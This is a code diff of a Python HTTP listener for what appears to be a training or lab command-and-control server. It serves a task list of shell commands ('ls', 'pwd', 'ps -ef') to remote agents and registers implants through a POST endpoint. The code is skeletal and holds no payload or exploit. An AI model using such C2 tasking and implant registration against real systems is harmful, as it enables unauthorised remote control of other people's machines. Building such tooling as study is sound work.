@@ -8,45 +8,43 @@
 # listen on.
 # The BaseHTTPRequestHandler class enables management of your various
 # HTTP requests (e.g. GET, POST, etc)
-from http.server import BaseHTTPRequestHandler
+from http.server import BaseHTTPRequestHandler, SimpleHTTPRequestHandler
 
 
-from .listener_helper import register_implant
+from .listener_helper import register_agent
 
 tasklist = ['*cmd,ls', '*cmd,pwd,', '*cmd,ps,e,f']
 
-
-# class Listener:
-#     def __init__(self, name, port, ipaddress):
-
-#         self.name = name
-#         self.port = port
-#         self.ipaddress = ipaddress
-#         self.webapp = HTTPServer(('', port), requestHandler)
-#         self.is_running = False
-        
-
-class Listener(BaseHTTPRequestHandler):       
+class Listener(BaseHTTPRequestHandler):
     def do_GET(self):
-        if self.path.endswith('/tasks/UUID'):
+        if self.path.endswith('/tasks/uuid'):
             self.send_response(200)
-            self.send_header('content-type', 'text/html')
-            # Always have to close the header.
+            self.send_header('Content-type', 'text/html')
+            self.send_header('Content-Disposition', 'attachment; filename="tasks.txt"')
             self.end_headers()
-            output = ''
-            # Add opening html body tags
-            output += '<html><body>'
-            # Add header to task list.
-            output += '<h1>Task List</h1>'
-            for task in tasklist:
-                output += task
-                # Add html break so each task is printed on a new line.
-                output += '</br>'
-            output += '?'
-            # Add closing HTML body tags
-            output += '</body></html>'
-            # Write to the browser window.
-            self.wfile.write(output.encode())
+
+            with open('/home/jonathan/oopythonlabs/red_alert/data/tasks.txt', 'rb') as file: 
+                self.wfile.write(file.read())
+    # def do_GET(self):
+    #     if self.path.endswith('/tasks/uuid'):
+    #         self.send_response(200)
+    #         self.send_header('content-type', 'text/html')
+    #         # Always have to close the header.
+    #         self.end_headers()
+    #         output = ''
+    #         # Add opening html body tags
+    #         output += '<html><body>'
+    #         # Add header to task list.
+    #         output += '<h1>Task List</h1>'
+    #         for task in tasklist:
+    #             output += task
+    #             # Add html break so each task is printed on a new line.
+    #             output += '</br>'
+    #         output += '?'
+    #         # Add closing HTML body tags
+    #         output += '</body></html>'
+    #         # Write to the browser window.
+    #         self.wfile.write(output.encode())
 
         # if self.path.endswith('/remove'):
         #     # Obtain ID from URL to ID which task needs to be removed.
@@ -70,7 +68,7 @@ class Listener(BaseHTTPRequestHandler):
 
     def do_POST(self):
         if self.path.endswith('/reg'):
-            register_implant(self)
+            register_agent(self)
 
         # This if block creates the post ability to remove a task.
         # if self.path.endswith('/remove'):
@@ -87,4 +85,9 @@ class Listener(BaseHTTPRequestHandler):
         #     self.send_response(301)
         #     self.send_header('content-type', 'text/html')
         #     self.send_header('Location', '/tasklist')
-        
+
+class MyHttpRequestHandler(SimpleHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == '/tasks/uuid':
+            self.path = 'mywebpage.html'
+        return SimpleHTTPRequestHandler.do_GET(self)
